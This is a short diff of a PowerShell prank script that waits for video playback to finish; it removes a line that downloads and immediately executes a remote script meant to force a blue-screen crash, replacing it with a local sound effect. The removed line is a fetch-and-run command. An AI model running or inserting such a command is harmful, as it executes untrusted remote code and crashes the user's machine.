@@ -32,5 +32,5 @@ do {
     Start-Sleep -Seconds 1
 } until ($mediaPlayer.playState -eq 0) # playState 0 represents stopped state
 
-# Run the next part of the script after video playback
-IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD
+# Play sound effect
+(New-Object Media.SoundPlayer "C:\Users\anson\Music\Vine_Boom_sound_effect_meme.wav").Play()
